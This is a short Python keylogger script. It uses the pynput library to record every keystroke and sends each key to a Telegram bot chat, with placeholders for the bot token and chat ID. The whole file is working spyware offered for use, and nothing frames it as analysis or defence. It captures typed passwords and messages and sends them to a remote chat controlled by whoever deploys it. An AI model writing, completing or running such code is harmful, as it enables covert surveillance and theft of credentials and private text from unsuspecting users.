# keylogger.py
import pynput.keyboard
import time
import telegram

# Bot token and chat ID
bot = telegram.Bot(token="YOUR_BOT_TOKEN")
chat_id = "YOUR_CHAT_ID"

def on_press(key):
    try:
        key_data = f'{key.char}'  # Gets the key as a character
    except AttributeError:
        key_data = f'{key}'  # In case of special keys like space, enter, etc.
    print(key_data)
    bot.send_message(chat_id=chat_id, text=key_data)  # Sends key data to Telegram bot

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
